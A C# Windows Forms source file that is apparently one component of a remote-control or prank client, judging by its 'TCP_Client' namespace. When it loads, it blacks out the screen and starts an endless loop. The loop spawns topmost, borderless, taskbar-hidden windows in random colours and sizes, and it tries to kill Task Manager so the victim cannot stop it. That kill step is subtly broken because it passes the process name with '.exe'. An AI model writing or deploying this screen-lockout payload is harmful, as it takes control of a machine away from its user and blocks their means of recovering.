using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;

namespace TCP_Client
{
    public partial class FrmColourSpam : Form
    {
        public FrmColourSpam()
        {
            InitializeComponent();
        }

        public static Thread t;

        public void CloseForm()
        {
            this.Close();
        }

        private void FrmColourSpam_Load(object sender, EventArgs e)
        {
            this.TopMost = true;

            t = new Thread(new ThreadStart(SpamLoop));
            t.Start();

            Form Cover = new Form();
            Cover.Show();
            Cover.Location = new Point(0, 0);
            Cover.Size = new Size(4000, 4000);
            Cover.BackColor = Color.Black;
            Cover.FormBorderStyle = FormBorderStyle.None;
        }

        private void SpamLoop()
        {
            while (true)
            {
                Form NewFrm = new Form();
                NewFrm.Show();
                NewFrm.TopMost = true;
                NewFrm.FormBorderStyle = FormBorderStyle.None;
                NewFrm.ShowInTaskbar = false;

                Random rnd = new Random();
                int rand1 = rnd.Next(0, 1000);
                int rand2 = rnd.Next(0, 1000);

                this.Location = new Point(rand1, rand2);
                this.Size = new Size(rand1, rand2);
                this.ShowInTaskbar = false;

                NewFrm.Location = new Point(rand1, rand2);
                NewFrm.Size = new Size(rand1, rand2);

                Random randonGen1 = new Random();
                Color randomColor1 = Color.FromArgb(randonGen1.Next(255), randonGen1.Next(255),
                randonGen1.Next(255));

                this.BackColor = randomColor1;

                Random randonGen2 = new Random();
                Color randomColor2 = Color.FromArgb(randonGen2.Next(255), randonGen2.Next(255),
                randonGen2.Next(255));

                NewFrm.BackColor = randomColor2;

                foreach (var process in Process.GetProcessesByName("Taskmgr.exe"))
                {
                    process.Kill();
                }
            }
        }

    }
}